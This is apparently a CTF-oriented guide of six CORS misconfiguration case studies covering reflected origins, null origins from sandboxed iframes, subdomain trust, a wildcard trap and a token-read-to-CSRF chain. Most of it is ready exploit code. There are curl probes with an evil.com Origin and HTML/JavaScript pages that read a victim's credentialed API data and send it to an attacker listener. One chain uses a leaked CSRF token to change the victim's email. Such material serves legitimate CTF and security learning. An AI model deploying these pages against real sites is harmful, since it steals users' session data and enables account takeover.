# Case studies — the CORS shapes, worked end to end

Five walkthroughs of the real CORS shapes — each a complete
probe-to-exfil flow.

---

## Case 1: the reflected origin + ACAC — the canonical shape

```text
GET /api/me with a session cookie. the response:
  ACAO: <your Origin, reflected>
  ACAC: true
  {"name":"x","balance":100,"flag":"FLAG{...}"}
```

```bash
# the measurement
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com'
#   ACAO: https://evil.com  ACAC: true  — REFLECTED + credentialed
# the check — does the cookie ride?
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
#   SameSite=None; Secure  → the cookie attaches cross-origin
```

```html
<!-- the exploit page on attacker.com -->
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://attacker/x?d='+btoa(JSON.stringify(d))))
</script>
```

The victim's browser sends the cookie (SameSite=None), the
reflected ACAO allows the read, the data lands on the listener.

## Case 2: `null` origin — the sandboxed-iframe shape

```text
the check is a strict allowlist — but `null` is in it. a
sandboxed or data: page's Origin is `null`.
```

```bash
curl -i -b "$CJ" "$BASE/api/x" -H 'Origin: null'
#   ACAO: null  ACAC: true  — the opaque origin is allowed
```

```html
<!-- a sandboxed iframe — its Origin is 'null' -->
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://t/api/x',{credentials:'include'})
 .then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
<script>window.onmessage=e=>fetch('https://attacker/?d='+e.data)</script>
```

## Case 3: the subdomain-trust shape

```text
the check accepts *.target.com — a subdomain you control or a
subdomain-Takeover — passes.
```

```bash
curl -i -b "$CJ" "$BASE/api/x" -H 'Origin: https://sub.target.com'
#   ACAO: https://sub.target.com  ACAC: true  — the suffix is trusted
```

Host the exploit page on any `.target.com` subdomain — an XSS on a
sibling, a takeover, or a CTF-supplied subdomain.

## Case 4: `*` on a sensitive endpoint — the trap that isn't

```text
/api/public returns public data; ACAO:* — a public read, NOT the
vuln. /api/me returns session data; ACAO:*+ACAC:true — INVALID,
the browser rejects. a `*` endpoint is never credentialed.
```

```bash
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com'
#   ACAO: *  ACAC: true
# the browser rejects `*`+credentials — the read FAILS — not the vuln
```

## Case 5: the token-read → CSRF-write chain

```text
the CORS endpoint is /api/csrf-token — a read that leaks the
token the write needs. the chain: CORS-read the token → use it in
a CSRF-write.
```

```html
<script>
fetch('https://t/api/csrf-token',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch('https://t/api/email',{method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({email:'a@x',csrf:t.token})}))
</script>
```

## Case 6: the airgapped-bot + `null` origin

```text
an internal CTF bot reads a page you hand it — no external domain.
a data: URL or a stored-XSS context whose Origin is `null` passes
a null-allowed CORS.
```

```bash
# the data: URL carries the whole exploit — the bot's fetch
# originates 'null' → passes the null-allowed check
```

## The per-case ledger rows

```bash
python3 tools/state.py <c> --hypothesis \
  "cors-case: <shape> -> credentialed read -> exfil -> FLAG{...}"
```
